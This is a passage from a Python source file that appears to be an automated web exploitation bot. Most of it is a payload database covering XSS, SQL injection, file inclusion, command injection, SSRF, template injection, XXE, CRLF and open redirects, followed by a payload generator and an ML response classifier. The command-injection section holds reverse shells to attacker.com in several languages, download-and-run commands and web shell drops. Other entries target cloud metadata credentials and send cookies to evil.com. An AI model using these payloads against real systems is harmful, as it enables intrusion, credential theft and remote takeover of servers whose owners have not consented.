                    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
                    "<link rel=import href=\"data:text/html,<script>alert(1)</script>\">",
                ],
                "ultra_long": [
                    "<svg/onload=alert(document.domain)>",
                    "<img/src=x onerror=alert(document.cookie)>",
                    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
                    "<script>document.write(unescape('%3Cscript%3Ealert(1)%3C/script%3E'))</script>",
                    "<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">",
                    "<svg><foreignObject><div xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)</script></div></foreignObject></svg>",
                    "<math><mtext><script>alert(1)</script></mtext></math>",
                    "<details open ontoggle=\"eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))\">",
                    "<input type=image src=x onerror=\"window[eval(atob('YWxlcnQ='))](1)\">",
                    "<a href=\"javascript:eval(atob('YWxlcnQoMSk='))\">click</a>",
                ],
                "multi_layer": [
                    "<scr<script>ipt>alert(1)</scr</script>ipt>",
                    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
                    "</title></style></textarea></script><svg/onload=alert(1)>",
                    "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
                    "<body onload=\"eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))\">",
                    "<input onfocus=\"eval(atob('YWxlcnQoMSk='))\" autofocus>",
                    "javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))",
                    "<img src=x onerror=\"new Function(atob('YWxlcnQoMSk='))()\" >",
                    "<svg><animate onbegin=\"eval(atob('YWxlcnQoMSk='))\" attributeName=x>",
                    "<details open ontoggle=\"new Function(atob('YWxlcnQoMSk='))()\">",
                ],
            },
            "sqli": {
                "short": [
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "' UNION SELECT NULL--",
                    "1' OR '1'='1",
                    "admin'--",
                    "' OR 'a'='a",
                    "1 OR 1=1",
                    "' OR 1=1#",
                    "'; DROP TABLE users--",
                    "' AND 1=1--",
                ],
                "medium": [
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT username,password FROM users--",
                    "' UNION SELECT @@version--",
                    "' UNION SELECT database()--",
                    "' UNION SELECT table_name FROM information_schema.tables--",
                    "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--",
                    "' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--",
                    "1' UNION SELECT NULL,NULL,NULL--",
                    "') OR ('1'='1",
                    "' AND SLEEP(5)--",
                ],
                "long": [
                    "' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--",
                    "' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--",
                    "' UNION SELECT username,password,email FROM users LIMIT 10--",
                    "' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--",
                    "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
                    "'; WAITFOR DELAY '0:0:5'--",
                    "' AND BENCHMARK(5000000,MD5('test'))--",
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                    "' UNION ALL SELECT NULL,CONCAT(username,0x3a,password) FROM users--",
                ],
                "ultra_long": [
                    "' UNION SELECT GROUP_CONCAT(table_name,0x3a,column_name) FROM information_schema.columns WHERE table_schema=database() ORDER BY table_name--",
                    "' UNION SELECT CONCAT(username,0x3a,password,0x3a,email),2,3,4 FROM users WHERE username LIKE '%admin%'--",
                    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(username,0x3a,password) FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                    "'; INSERT INTO users(username,password,role) VALUES('hacker','password123','admin')--",
                    "'; UPDATE users SET role='admin',password=MD5('hacked') WHERE username='test'--",
                    "' UNION SELECT load_file('/etc/passwd'),2,3--",
                    "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '/tmp/data.txt' FROM users--",
                    "'; EXEC xp_cmdshell('whoami')--",
                    "' UNION SELECT CONCAT(0x7e7e7e,version(),0x7e7e7e)--",
                    "1' AND IF((SELECT COUNT(*) FROM users WHERE SUBSTRING(password,1,1)='a')>0,SLEEP(5),0)--",
                ],
                "multi_layer": [
                    "'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL--",
                    "'/**/OR/**/1=1/**/--",
                    "'%20UNION%20SELECT%20NULL,NULL--",
                    "'%09OR%09'1'%09=%09'1",
                    "'%0aUNION%0aSELECT%0aNULL--",
                    "'%27%20OR%20%271%27%3D%271",
                    "%27%20UNION%20SELECT%20NULL%2CNULL--",
                    "'/*!UNION*/SELECT/*!NULL*/,/*!NULL*/--",
                    "'/**/AND/**/1=1/**/--",
                    "'%0bOR%0b1=1%0b--",
                ],
            },
            "lfi": {
                "short": [
                    "../../../etc/passwd",
                    "/etc/passwd",
                    "..\\..\\..\\windows\\win.ini",
                    "file:///etc/passwd",
                    "../../../etc/hosts",
                    "../../../var/log/apache2/access.log",
                    "../../../proc/self/environ",
                    "../../../proc/version",
                    "../../../etc/shadow",
                    "../../../etc/issue",
                ],
                "medium": [
                    "../../../../etc/passwd",
                    "../../../../../etc/passwd",
                    "..%2f..%2f..%2fetc%2fpasswd",
                    "....//....//....//etc/passwd",
                    "..\\..\\..\\etc\\passwd",
                    "php://filter/convert.base64-encode/resource=index.php",
                    "php://filter/read=convert.base64-encode/resource=config.php",
                    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                    "expect://id",
                    "../../../etc/passwd%00",
                ],
                "long": [
                    "..%252f..%252f..%252fetc%252fpasswd",
                    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
                    "..%c0%af..%c0%af..%c0%afetc/passwd",
                    "php://filter/convert.base64-encode/resource=../../../etc/passwd",
                    "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
                    "php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd",
                    "../../../var/log/apache2/access.log%00",
                    "../../../var/log/nginx/access.log%00",
                    "../../../var/log/auth.log%00",
                    "..%2f..%2f..%2fproc/self/environ%00",
                ],
                "ultra_long": [
                    "....//....//....//....//....//....//....//etc/passwd",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "php://filter/convert.base64-encode/resource=php://filter/convert.base64-encode/resource=/etc/passwd",
                    "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
                    "....//....//....//....//....//....//....//....//....//....//etc/passwd",
                    "/etc/passwd%00.jpg%00.png%00.txt%00.html",
                    "php://filter/convert.base64-encode/resource=../../../var/log/apache2/error.log",
                    "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
                    "php://filter/read=convert.base64-encode/resource=../../../../etc/shadow",
                    "data://text/plain;base64," + base64.b64encode(b"<?php system('id'); ?>").decode(),
                ],
                "multi_layer": [
                    "..%252f..%252f..%252fetc%252fpasswd%00",
                    "php://filter/convert.base64-encode/resource=..%2f..%2f..%2fetc%2fpasswd",
                    "....//....//....//etc//passwd%00.jpg",
                    "..%c0%af..%c0%af..%c0%afetc%2fpasswd%00",
                    "php://filter/convert.base64-encode|convert.base64-decode/resource=/etc/passwd",
                    "data://text/plain;base64," + base64.b64encode(b"../../../etc/passwd").decode(),
                    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%00",
                    "expect://cat%20/etc/passwd",
                    "php://filter/read=string.rot13/resource=/etc/passwd",
                    "compress.zlib:///etc/passwd",
                ],
            },
            "rce": {
                "short": [
                    "; id",
                    "| id",
                    "$(id)",
                    "`id`",
                    "; whoami",
                    "| whoami",
                    "; pwd",
                    "; uname -a",
                    "; ls -la",
                    "| cat /etc/passwd",
                ],
                "medium": [
                    "; cat /etc/passwd",
                    "| cat /etc/passwd",
                    "; ls -la /",
                    "| ls -la /",
                    "; wget http://attacker.com/shell.sh",
                    "; curl http://attacker.com/shell.sh",
                    "& whoami",
                    "| whoami",
                    "& dir",
                    "| type C:\\windows\\win.ini",
                ],
                "long": [
                    "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
                    "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                    "; nc -e /bin/sh attacker.com 4444",
                    "| nc -e /bin/sh attacker.com 4444",
                    "& powershell -c \"Get-Process\"",
                    "& certutil -urlcache -split -f http://attacker.com/shell.exe shell.exe",
                    "; curl -o /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh",
                    "| wget -O /tmp/shell.sh http://attacker.com/shell.sh && bash /tmp/shell.sh",
                    "${7*7}",
                    "{{7*7}}",
                ],
                "ultra_long": [
                    "; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                    "; perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
                    "; ruby -rsocket -e'f=TCPSocket.open(\"attacker.com\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                    "| (curl -s http://attacker.com/shell.sh | bash)",
                    "; echo '<?= system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php",
                    "{{''.constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id').toString()}}",
                    "${T(java.lang.Runtime).getRuntime().exec('id')}",
                    "; php -r 'echo shell_exec(\"id\");'",
                    "; echo PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+ | base64 -d > /var/www/html/cmd.php",
                    "| php -r '$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                ],
                "multi_layer": [
                    "%0a%0did%0a%0d",
                    "%3b%20id",
                    "%7c%20id",
                    "%24%28id%29",
                    "%60id%60",
                    ";%0aid",
                    "|%0aid",
                    "$(echo%20id|bash)",
                    ";$(echo%20aWQ=|base64%20-d|bash)",
                    "|$(echo%20aWQ=|base64%20-d|bash)",
                ],
            },
            "ssrf": {
                "short": [
                    "http://127.0.0.1/",
                    "http://localhost/",
                    "http://[::1]/",
                    "http://0.0.0.0/",
                    "file:///etc/passwd",
                    "dict://127.0.0.1:6379/info",
                    "http://127.1/",
                    "http://127.0.1/",
                    "http://127.0.0.1:22/",
                    "http://127.0.0.1:3306/",
                ],
                "medium": [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://169.254.169.254/latest/user-data/",
                    "http://metadata.google.internal/computeMetadata/v1/",
                    "http://100.100.100.200/latest/meta-data/",
                    "http://169.254.170.2/v2/credentials/",
                    "gopher://127.0.0.1:6379/_INFO%0d%0a",
                    "ftp://127.0.0.1/",
                    "ldap://127.0.0.1/",
                    "http://127.0.0.1:9200/",
                    "http://127.0.0.1:27017/",
                ],
                "long": [
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                    "http://127.0.0.1.nip.io/",
                    "http://[::ffff:127.0.0.1]/",
                    "http://0x7f000001/",
                    "http://2130706433/",
                    "http://0177.0.0.1/",
                    "http://127.0.0.1%23@attacker.com/",
                    "http://attacker.com\\@127.0.0.1/",
                ],
                "ultra_long": [
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",
                    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
                    "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
                    "http://127。0。0。1/",
                    "http://①②⑦.⓪.⓪.①/",
                    "http://127.0.0.1:80@attacker.com/",
                    "http://attacker.com#@127.0.0.1/",
                    "http://attacker.com?@127.0.0.1/",
                    "http://127.0.0.1%2523@attacker.com/",
                    "http://attacker.com%252f@127.0.0.1/",
                ],
                "multi_layer": [
                    "http://127.0.0.1/%252e%252e%252f",
                    "http://[::ffff:7f00:0001]/",
                    "http://127.0.0.1:80%2523@attacker.com/",
                    "http://0x7f.0x00.0x00.0x01/",
                    "http://0177.0000.0000.0001/",
                    "http://127.0.0.1.nip.io/latest/meta-data/",
                    "http://metadata.nip.io/computeMetadata/v1/",
                    "http://169.254.169.254.nip.io/latest/meta-data/",
                    "http://[0:0:0:0:0:ffff:7f00:0001]/",
                    "http://127.0.0.1%253a80@attacker.com/",
                ],
            },
            "ssti": {
                "short": [
                    "{{7*7}}",
                    "${7*7}",
                    "#{7*7}",
                    "<%= 7*7 %>",
                    "{{config}}",
                    "${.data_model}",
                    "{{7*'7'}}",
                    "${7*'7'}",
                    "#{7*'7'}",
                    "{{self}}",
                ],
                "medium": [
                    "{{config.items()}}",
                    "{{''.__class__.__mro__[1].__subclasses__()}}",
                    "${.globals}",
                    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
                    "{{lipsum.__globals__['os'].popen('id').read()}}",
                    "<#assign x=\"freemarker.template.utility.Execute\"?new()>${x('id')}",
                    "{{['id']|filter('system')}}",
                    "{{['id']|map('system')|join}}",
                    "${self.module.cache.util.os.popen('id').read()}",
                ],
                "long": [
                    "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
                    "{{url_for.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}",
                    "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}",
                    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex('cat /etc/passwd')}",
                    "{{cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}",
                    "{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}",
                    "{{namespace.__init__.__globals__.os.popen('id').read()}}",
                    "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                    "${T(java.lang.Runtime).getRuntime().exec('id')}",
                    "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()$str.valueOf($chr.toChars($ex.exitValue()))",
                ],
                "ultra_long": [
                    "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()|e}}",
                    "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()|e}}",
                    "{{cycler.__init__.__globals__.os.popen('cat /etc/shadow').read()|e}}",
                    "{{lipsum.__globals__['os'].popen('ls -la /').read()|e}}",
                    "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()|replace('\\n','<br>')|safe}}",
                    "{{url_for.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"cat /etc/passwd\").read()')}}",
                    "{{namespace.__init__.__globals__.os.popen('cat /etc/passwd').read()|replace('\\n','<br>')|safe}}",
                    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex('cat /etc/passwd')?html}",
                    "${T(java.lang.Runtime).getRuntime().exec(new String[]{\"cat\",\"/etc/passwd\"})}",
                    "{{self._TemplateReference__context.config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                ],
                "multi_layer": [
                    "{{7*7}}<!-- -->{{7*7}}",
                    "${7*7}<!-- -->${7*7}",
                    "{{''.__class__.__mro__[1].__subclasses__()}}<!-- -->",
                    "{{config}}<!-- -->{{config}}",
                    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}<!-- -->",
                    "<#assign x=\"freemarker.template.utility.Execute\"?new()>${x('id')}<!-- -->",
                    "{{cycler.__init__.__globals__.os.popen('id').read()}}<!-- -->",
                    "{{lipsum.__globals__['os'].popen('id').read()}}<!-- -->",
                    "${self.module.cache.util.os.popen('id').read()}<!-- -->",
                    "{{url_for.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}<!-- -->",
                ],
            },
            "xxe": {
                "short": [
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">]><foo>&xxe;</foo>",
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]>",
                ],
                "medium": [
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo>&exfil;</foo>",
                    "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
                    "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/xxe.dtd\">%dtd;]><data>&send;</data>",
                    "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\"/></svg>",
                ],
                "long": [
                    "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>\">%xxe;%eval;%exfil;]><foo>test</foo>",
                    "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/xxe.dtd\">%dtd;]><data>&send;</data>",
                    "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\">&xxe;</svg>",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
                ],
                "ultra_long": [
                    "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/exfil?data=%file;'>\">%xxe;%eval;%exfil;]><foo>test</foo>",
                    "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/xxe.dtd\">%dtd;]><data>&send;</data>",
                    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM \"http://attacker.com/xxe_external.dtd\">%remote;]><foo>&send;</foo>",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
                ],
                "multi_layer": [
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd%00\">]><foo>&xxe;</foo>",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd%00.jpg\">]><foo>&xxe;</foo>",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd%00\">]><foo>&xxe;</foo>",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://cat%20/etc/passwd\">]><foo>&xxe;</foo>",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==\">]><foo>&xxe;</foo>",
                ],
            },
            "crlf": {
                "short": [
                    "%0d%0aSet-Cookie:session=evil",
                    "%0aSet-Cookie:session=evil",
                    "\\r\\nSet-Cookie:session=evil",
                    "\\nSet-Cookie:session=evil",
                    "%0d%0aLocation:http://evil.com",
                ],
                "medium": [
                    "%0d%0a%0d%0a<script>alert(1)</script>",
                    "%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
                    "/%0d%0aLocation:http://evil.com",
                    "%E5%98%8A%E5%98%8DSet-Cookie:session=evil",
                    "%0d%0aSet-Cookie:session=evil%0d%0aSet-Cookie:admin=true",
                ],
                "long": [
                    "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0aContent-Length:25%0d%0a%0d%0a<script>alert(1)</script>",
                    "%0d%0aSet-Cookie:session=evil%0d%0aSet-Cookie:admin=true%0d%0aSet-Cookie:role=hacker",
                    "%0d%0aLocation:http://evil.com%0d%0aSet-Cookie:redirect=true",
                    "%0d%0aX-Injected:true%0d%0aSet-Cookie:session=evil%0d%0a",
                    "%0d%0aContent-Type:text/html%0d%0a%0d%0a<html><body><script>alert(document.cookie)</script></body></html>",
                ],
                "ultra_long": [
                    "%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0aContent-Length:100%0d%0a%0d%0a<html><head><script>alert('XSS via CRLF')</script></head><body><h1>Injected</h1></body></html>",
                    "%0d%0aSet-Cookie:session=evil;Path=/;HttpOnly=false%0d%0aSet-Cookie:admin=true;Path=/;Secure=false%0d%0aSet-Cookie:role=hacker;Path=/;SameSite=None",
                    "%0d%0aLocation:http://evil.com%0d%0aSet-Cookie:redirect=true%0d%0aX-Frame-Options:ALLOWALL%0d%0aContent-Security-Policy:default-src *",
                    "%0d%0a%0d%0a<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
                    "%0d%0aAccess-Control-Allow-Origin:*%0d%0aAccess-Control-Allow-Credentials:true%0d%0aSet-Cookie:session=evil",
                ],
                "multi_layer": [
                    "%250d%250aSet-Cookie:session=evil",
                    "%0d%0a%0d%0a%0d%0aSet-Cookie:session=evil",
                    "%%0d0d%%0a0aSet-Cookie:session=evil",
                    "%0d%0a%20Set-Cookie:session=evil",
                    "%0d%0a%09Set-Cookie:session=evil",
                ],
            },
            "open_redirect": {
                "short": [
                    "http://evil.com",
                    "//evil.com",
                    "///evil.com",
                    "https://evil.com",
                    "/\\evil.com",
                ],
                "medium": [
                    "//evil.com/%2f..",
                    "/%5cevil.com",
                    "https:evil.com",
                    "//evil%E3%80%82com",
                    "//evil.com#@trusted.com",
                    "//trusted.com@evil.com",
                    "//evil.com%23@trusted.com",
                    "https://trusted.com%2fevil.com",
                    "https://trusted.com.evil.com",
                    "/redirect?url=http://evil.com",
                ],
                "long": [
                    "https://trusted.com@evil.com/phishing",
                    "//evil.com#@trusted.com/safe",
                    "https://trusted.com.evil.com/login",
                    "/redirect?return_url=http://evil.com/phishing",
                    "/redirect?next=http://evil.com%23@trusted.com",
                    "//evil.com%2f@trusted.com",
                    "https://evil.com%2523@trusted.com",
                    "//evil.com%252f@trusted.com",
                    "https://trusted.com/redirect?url=http://evil.com",
                    "/redirect?target=http://evil.com%23@trusted.com/safe",
                ],
                "ultra_long": [
                    "https://trusted.com@evil.com/phishing/login?redirect=http://evil.com/steal",
                    "//evil.com%2523@trusted.com/safe/page",
                    "https://trusted.com.evil.com/phishing/login?user=admin&pass=stolen",
                    "/redirect?return_url=http://evil.com/phishing?original=http://trusted.com",
                    "//evil.com%2f%2f@trusted.com/safe/page?redirect=http://evil.com",
                    "https://evil.com%252f%252f@trusted.com/safe",
                    "//evil.com%2523%2523@trusted.com/safe/page",
                    "https://trusted.com/redirect?next=http://evil.com%2523@trusted.com/safe",
                    "/redirect?url=http://evil.com&callback=http://trusted.com",
                    "https://evil.com%252f%252f%2523@trusted.com/safe/page?redirect=http://evil.com/steal",
                ],
                "multi_layer": [
                    "%2f%2fevil.com",
                    "https%3a%2f%2fevil.com",
                    "%2f%5cevil.com",
                    "%2f%2f%2f%2fevil.com",
                    "https%3a%2f%2ftrusted.com@evil.com",
                    "%2f%2fevil.com%2523@trusted.com",
                    "https%3a%2f%2fevil.com%252f@trusted.com",
                    "%2fredirect%3furl%3dhttp%3a%2f%2fevil.com",
                    "%2f%2fevil.com%252523@trusted.com",
                    "https%3a%2f%2ftrusted.com%252fevil.com",
                ],
            },
        }

        return payloads_db.get(vuln_type, {}).get(complexity, [])

    # ----------------------------------------------------------
    # MAIN GENERATION METHOD
    # ----------------------------------------------------------
    def generate_all_payloads(
        self,
        vuln_type: str,
        context: Dict[str, Any],
        max_total: int = None
    ) -> List[MultiLayerPayload]:
        """Generate all payload variants untuk satu vulnerability."""
        max_total = max_total or self.config["max_payloads_per_finding"]
        all_payloads = []

        # Generate per complexity level
        short = self._generate_short_payloads(vuln_type, context)[:self.config["short_payloads"]]
        medium = self._generate_medium_payloads(vuln_type, context)[:self.config["medium_payloads"]]
        long_p = self._generate_long_payloads(vuln_type, context)[:self.config["long_payloads"]]
        ultra = self._generate_ultra_long_payloads(vuln_type, context)[:self.config["ultra_long_payloads"]]
        multi = self._generate_multi_layer_payloads(vuln_type, context)[:self.config["multi_layer_payloads"]]

        all_payloads.extend(short)
        all_payloads.extend(medium)
        all_payloads.extend(long_p)
        all_payloads.extend(ultra)
        all_payloads.extend(multi)

        # Deduplicate
        seen = set()
        unique = []
        for p in all_payloads:
            if p.payload not in seen:
                seen.add(p.payload)
                unique.append(p)

        # Sort by confidence (descending)
        unique.sort(key=lambda x: x.confidence, reverse=True)

        return unique[:max_total]

    def get_stats(self) -> Dict[str, int]:
        return dict(self.generation_stats)


# ============================================================
# ML RESPONSE ANALYZER
# ============================================================
class MLResponseAnalyzer:
    """ML-powered response classification: execution vs raw HTML vs blocked."""

    def __init__(self, config: Dict):
        self.config = config
        self.model = None
        self.scaler = StandardScaler() if HAS_SKLEARN else None
        self.tfidf = TfidfVectorizer(max_features=500) if HAS_SKLEARN else None
        self.trained = False
        self.training_data = []
        self.training_labels = []
        self.model_path = "./.vuln_bot_ml_model.pkl"
        self.scaler_path = "./.vuln_bot_ml_scaler.pkl"
        self.baseline_responses = []
        self._load_model()

    def _load_model(self):
        """Load pre-trained model."""
        if not HAS_SKLEARN:
            return
        try:
            if os.path.exists(self.model_path):
                self.model = joblib.load(self.model_path)
                if os.path.exists(self.scaler_path):
                    self.scaler = joblib.load(self.scaler_path)
                self.trained = True
                print("  [OK] Loaded ML response analyzer model")
        except:
            self.model = None

    def _save_model(self):
        """Save trained model."""
        if not HAS_SKLEARN or self.model is None:
            return
        try:
            joblib.dump(self.model, self.model_path)
            joblib.dump(self.scaler, self.scaler_path)
        except:
            pass

    def collect_baseline(self, response_text: str):
        """Collect baseline responses for comparison."""
        self.baseline_responses.append(response_text)
        if len(self.baseline_responses) > 10:
            self.baseline_responses = self.baseline_responses[-10:]

    def _compute_baseline_similarity(self, response_text: str) -> float:
        """Compute similarity to baseline responses."""
        if not self.baseline_responses:
            return 0.0

        similarities = []
        for baseline in self.baseline_responses:
            ratio = difflib.SequenceMatcher(None, response_text[:5000], baseline[:5000]).ratio()
            similarities.append(ratio)

        return max(similarities) if similarities else 0.0

    def extract_features(self, response_text: str, status_code: int) -> List[float]:
        """Extract features for ML classification."""
        features = []

        # Basic features
        features.append(len(response_text))
        features.append(status_code)
        features.append(response_text.count('\n'))
        features.append(response_text.count('<'))
        features.append(response_text.count('>'))

        # HTML indicator count
        html_count = 0
        for pattern in RAW_HTML_INDICATORS:
            if re.search(pattern, response_text, re.IGNORECASE):
                html_count += 1
        features.append(html_count)

        # Execution pattern count
        exec_count = 0
        for category in EXECUTION_PATTERNS.values():
            for pattern in category:
                if re.search(pattern, response_text, re.IGNORECASE):
                    exec_count += 1
        features.append(exec_count)

        # Block pattern count
        block_count = 0
        for pattern in BLOCKED_INDICATORS:
            if re.search(pattern, response_text, re.IGNORECASE):
                block_count += 1
        features.append(block_count)

        # Error pattern count
        error_count = 0
        for pattern in ERROR_INDICATORS:
            if re.search(pattern, response_text, re.IGNORECASE):
                error_count += 1
        features.append(error_count)

        # Baseline similarity
        features.append(self._compute_baseline_similarity(response_text))

        # Text statistics
        words = response_text.split()
